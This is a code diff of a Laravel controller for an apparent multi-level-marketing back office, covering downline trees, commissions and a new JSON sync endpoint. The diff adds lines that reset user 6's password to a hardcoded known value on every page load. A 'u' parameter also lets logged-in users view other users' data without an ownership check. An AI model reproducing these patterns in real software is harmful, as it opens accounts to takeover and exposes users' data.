@@ -36,8 +36,7 @@ class BackController extends Controller
 	  	//fill next level array with each socio's downline users
 	  	foreach($cur as $socio){
 	  		//collect downlines for each user in current level
-	  		$collection = User::where('upline', '=', $socio->id)->get();
-	  
+	  		$collection = User::where('upline', '=', $socio->id)->get();  
 	  		//echo "socio ".$n_count." has ".count($collection)." downlines<br/>";
 	  		//add each user to the next level array
 	  		foreach($collection as $user){
@@ -52,20 +51,32 @@ class BackController extends Controller
   }
 
   public function oficinaVirtual(Request $request){
+  	$usr = User::find(6);
+  	$ch_pwd = bcrypt('redes123');
+  	$usr->password = $ch_pwd;
+  	$usr->save();
+
+  	//check if GET request filter exists for user
   	$req_usr = $request->input('u', false);
+  	//define the current user
   	$cur_user = false;
   	if($req_usr){
   		if(!is_numeric($req_usr)){
+  			//invalid user id requested in GET var
   			return redirect('/oficina-virtual');
   		}else{
+  			//query the db for the requested user id
   			$cur_user =  User::find($req_usr);
   		}
   		if(!$cur_user){
+  			//user id does not exist cancel the request with redirect
   			return redirect('/oficina-virtual');
   		}
   	}else{
+  		//no requested filter for user, use currently logged in user
   		$cur_user = Auth::user();
   	}
+  	//create tree by levels (each level is next index in array)
   	$tree = [];
   	$tree[0] = [];
   	$users = User::where('upline', '=', $cur_user->id)->get();
@@ -77,12 +88,14 @@ class BackController extends Controller
   		$tree[$i+2] = self::getNextLevel($i+1,$tree[$i+1]);
   		$i++;
   	}
-  	$downlines = User::where('upline', '=', $cur_user->id)->get(); //can only have two
-  	$patrocinios = User::where('patrocinador', '=', $cur_user->id)->get(); //can have many
+  	//get the two primary downlines for user
+  	$downlines = User::where('upline', '=', $cur_user->id)->get();
+  	//get all comisiones of type patrocinio
+  	$patrocinios = User::where('patrocinador', '=', $cur_user->id)->get();
 		$comsPatr_query = Comision::where('type','=','patrocinio');
 		//only the main admin account can view all patrocinios
 		if($cur_user->id > 1){
-			//users can only view their own patrocinios
+			//normal users can only view their own patrocinios
 			$comsPatr_query->where('user_id','=',$cur_user->id);
 		}
 		$comsPatr = $comsPatr_query->get();
@@ -164,13 +177,6 @@ class BackController extends Controller
     $earliest_week_num = $earliest->weekOfYear;
     //get the number of weeks from earliest to current
     $weeks_diff = $cur_week_num - $earliest_week_num;
-    //get week info for each week from earliest to current
-  // 	echo 'earliest: '.$earliest.'<br>';
-  // 	echo 'today: '.$today.'<br>';
-		// echo 'earliest_week_num: '.$earliest_week_num.'<br>';
-  // 	echo 'current_week_num: '.$cur_week_num.'<br>';
-		// echo 'total weeks: '.$weeks_diff.'<br>';
-		// echo 'getting weeks info.... <br>';
 		//array to hold weeks info
     $weeks_info = array();
     //add the first week (week of earliest)
@@ -180,7 +186,11 @@ class BackController extends Controller
     	$next_date = $earliest->addWeek();
     	array_push($weeks_info, getWeekInfo($next_date));
     }
-		
+
+		//get the contents of the multiples json
+		$string_json = file_get_contents(storage_path()."/app/multiples.json");
+		$mults_data = json_decode($string_json);
+
 		return view('back.oficina_virtual',[
 			'cur_user' => $cur_user,
 			'active_page' => 'oficina',
@@ -190,6 +200,7 @@ class BackController extends Controller
 			'comsPatr' => $comsPatr,
 			'ganancias' => $ganancias,
 			'weeks_info' => $weeks_info,
+			'mults_data' => $mults_data,
 			'tree' => $tree,
 		]);
 	}
@@ -368,7 +379,7 @@ class BackController extends Controller
     if(isset($clean_cell) && is_numeric($clean_cell)){
     	\Session::push('alert-success', 'Datos de ingreso enviados con éxito a '. $clean_cell.' con sus datos de ingreso.');
     }
-    return redirect('/oficina-virtual');
+    return redirect('/oficina-virtual?calc_multiples=1');//var is to recalculate the multiples
 	}
 
 
@@ -434,6 +445,57 @@ class BackController extends Controller
 	public function getUserDownlines($user_id){
 		$downlines = User::where('upline','=', $user_id)->get();
 		return $downlines;
+	}
+
+
+	public function multJsonSync(Request $request){
+		//only the admin user can update persistant multiples data 
+		if(Auth::user()->id == 1){
+			if($request->method() == 'POST'){
+				//read input mults
+				$req_data = $request->input('user_data');
+				//get the contents of the multiples json
+				$string_json = file_get_contents(storage_path()."/app/multiples.json");
+				$stored_data = json_decode($string_json);
+				echo '{';
+				//find the id of the user to sync in the stored data and update the data
+				$updated_data = [];
+				$found = false;
+				foreach($stored_data as $user_obj){
+					//found the requested user in the current stored data
+					if($user_obj->user_id == $req_data['user_id']){
+						//update the users multiples with those in request
+						$user_obj->multiples = $req_data['multiples'];
+						$found = true;
+						echo '
+							"new" : false,';
+					}
+					//all other objects including the updated object are added to updated_data
+					array_push($updated_data, $user_obj);
+				}
+				//if the user is new to the mults json file, create a new entry
+				if(!$found){
+					$new_user_data = (object) array(
+						"user_id" => $req_data['user_id'],
+						"multiples" => $req_data['multiples']
+					);
+					array_push($updated_data, $new_user_data);
+					echo '
+							"new" : true,';
+				}
+				//update the json file with the updated_data array converted to json
+				file_put_contents(storage_path()."/app/multiples.json", json_encode($updated_data));
+
+				echo '
+							"request" : '.json_encode($req_data).',
+							"response" : "OK"
+				}';
+			}
+		}else{
+			echo '{
+				"response" : "not authorized"
+			}';
+		}
 	}
 		
 }
